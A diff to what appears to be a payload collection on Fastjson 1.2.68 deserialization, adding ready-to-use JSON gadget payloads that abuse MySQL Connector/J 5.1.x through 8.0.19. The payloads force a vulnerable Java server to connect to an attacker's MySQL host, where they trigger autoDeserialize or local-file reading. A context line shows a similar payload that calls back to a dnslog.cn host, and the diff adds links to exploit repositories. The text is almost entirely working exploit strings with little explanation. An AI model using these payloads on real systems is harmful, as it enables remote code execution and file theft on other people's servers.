@@ -253,6 +253,26 @@ payload:
 {"@type":"java.lang.AutoCloseable", "@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"172.20.64.40","portToConnectTo":3306,"url":"jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","databaseToConnectTo":"test","info":{"@type":"java.util.Properties","PORT":"3306","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","user":"yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn","PORT.1":"3306","HOST.1":"172.20.64.40","NUM_HOSTS":"1","HOST":"172.20.64.40","DBNAME":"test"}}
 ```
 
+Mysqlconnector 5.1.x
+```
+
+{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"dbname","url":""}
+```
+
+Mysqlconnector 6.0.2 or 6.0.3
+```
+{"@type": "java.lang.AutoCloseable","@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection","proxy":{"connectionString":{"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"}}}
+```
+
+Mysqlconnector 6.x or < 8.0.20
+```
+{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}
+```
+
 参考：
 - https://github.com/su18/fastjson-commons-io
 - [Fastjson 68 commons-io AutoCloseable](https://su18.org/post/fastjson-1.2.68/)
+- https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf
+- https://su18.org/post/fastjson/#8-fastjson-1268
+- https://github.com/safe6Sec/Fastjson
+- https://f5.pm/go-82366.html
